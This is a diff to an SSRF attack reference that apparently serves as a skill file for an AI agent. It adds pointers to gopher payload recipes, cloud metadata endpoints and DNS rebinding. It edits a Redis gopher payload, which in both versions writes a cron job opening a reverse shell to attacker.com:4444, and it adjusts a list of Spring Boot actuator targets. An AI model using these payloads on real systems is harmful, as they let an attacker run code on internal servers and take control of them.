@@ -21,7 +21,16 @@ Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
 - Gopher protocol full TCP injection — Redis, MySQL, FastCGI payloads via Gopherus
 - URL parser confusion for filter bypass — `#@`, `\@`, `%00@`, IPv6-mapped IPv4
 
-如果只是刚发现一个会取 URL 的参数，直接在这里做第一轮确认即可。
+### Advanced Reference
+
+Also load [URL_PARSER_TRICKS.md](./URL_PARSER_TRICKS.md) when you need:
+- URL parser differential table: Python urllib vs requests vs Java URL vs PHP parse_url vs Node url.parse vs Go net/url
+- Full cloud metadata endpoint catalog (AWS IMDSv1/v2, GCP, Azure, DigitalOcean, Alibaba Cloud, Oracle Cloud, Kubernetes, Hetzner, OpenStack)
+- gopher:// payload recipes for Redis, MySQL, SMTP, FastCGI, Memcached (with encoding rules)
+- DNS Rebinding detailed attack flow with TTL manipulation and TOCTOU analysis
+- PDF/wkhtmltopdf/WeasyPrint/Chrome headless/PhantomJS SSRF patterns and exfiltration techniques
+
+If you just found a parameter that fetches a URL, perform first-pass confirmation here directly.
 
 ### First-pass payloads
 
@@ -218,7 +227,7 @@ ftp://attacker.com/          ← triggers FTP connection
 
 ### Redis Gopher SSRF (full RCE potential)
 ```
-gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2456%0D%0A%0D%0A%0A%0A*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0A%0A%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
+gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0Aping%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2456%0D%0A%0D%0A%0A%0A*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0A%0A%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
 ```
 
 ---
@@ -265,8 +274,8 @@ dict://127.0.0.1:6379/BGSAVE
 http://127.0.0.1:8080/admin
 http://127.0.0.1:8443/admin
 http://127.0.0.1:9000/actuator   ← Spring Boot actuator (exposed endpoints)
-http://127.0.0.1:9000/actuator/shutdown
 http://127.0.0.1:9000/actuator/env
+http://127.0.0.1:9000/actuator/heapdump
 ```
 
 ---
